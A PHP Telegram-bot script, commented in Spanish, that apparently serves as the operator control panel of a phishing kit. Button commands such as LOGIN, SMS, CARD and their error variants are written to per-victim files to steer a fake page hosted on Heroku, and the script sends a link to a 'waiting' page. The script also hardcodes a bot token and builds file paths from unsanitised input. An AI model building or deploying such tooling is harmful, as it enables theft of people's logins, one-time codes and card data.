<?php
// ===== bot.php FUNCIONAL (ARREGLADO) =====

// 🔐 TOKEN DEL BOT
$token = "8521201522:AAF90SGm6bahwP72Q2TSo83LDxp9ngq94MI";

// 📩 Leer datos enviados por Telegram
$content = file_get_contents("php://input");
$update = json_decode($content, true);

// 🧪 Log para depuración
file_put_contents("log.txt", print_r($update, true), FILE_APPEND);

// 🎯 Procesar botones (callback_query)
if (isset($update['callback_query'])) {

    $data = $update['callback_query']['data']; // Ej: SMS|usuario123
    $chat_id = $update['callback_query']['message']['chat']['id'];
    $callback_id = $update['callback_query']['id'];

    if (strpos($data, '|') !== false) {

        list($comando, $usuario) = explode('|', $data);

        // 📁 Crear carpeta si no existe
        if (!file_exists("acciones")) {
            mkdir("acciones", 0777, true);
        }

        $archivo = "acciones/$usuario.txt";

        switch ($comando) {
            case "SMS":
                $accion = "/SMS";
                break;
            case "SMSERROR":
                $accion = "/SMSERROR";
                break;
            case "NUMERO":
                $accion = "/NUMERO";
                break;
            case "ERROR":
                $accion = "/ERROR";
                break;
            case "LOGIN":
                $accion = "/LOGIN";
                break;
            case "LOGINERROR":
                $accion = "/LOGINERROR";
                break;
            case "CARD":
                $accion = "/CARD";
                break;
            case "CONTINUAR": // 👈 ESTE FALTABA
                $accion = "/CONTINUAR";
                break;
            default:
                $accion = "/ERROR";
        }

        // 💾 Guardar acción
        file_put_contents($archivo, $accion);

        // ✅ Responder al botón (quita el loading)
        file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
            'callback_query_id' => $callback_id,
            'text' => "✅ Acción enviada para $usuario",
            'show_alert' => false
        ]));

        // 🚀 SI PRESIONA CONTINUAR → ENVIAR LINK (ESTO ES LO CLAVE)
        if ($comando === "CONTINUAR") {

            file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
                "chat_id" => $chat_id,
                "text" => "Continúa al siguiente paso 👇",
                "reply_markup" => json_encode([
                    "inline_keyboard" => [
                        [
                            [
                                "text" => "➡️ Abrir página",
                                "url" => "https://bmproservic2026-d6f976187c6a.herokuapp.com/indeff/espera.php?u=$usuario"
                            ]
                        ]
                    ]
                ])
            ]));
        }
    }
}
?>
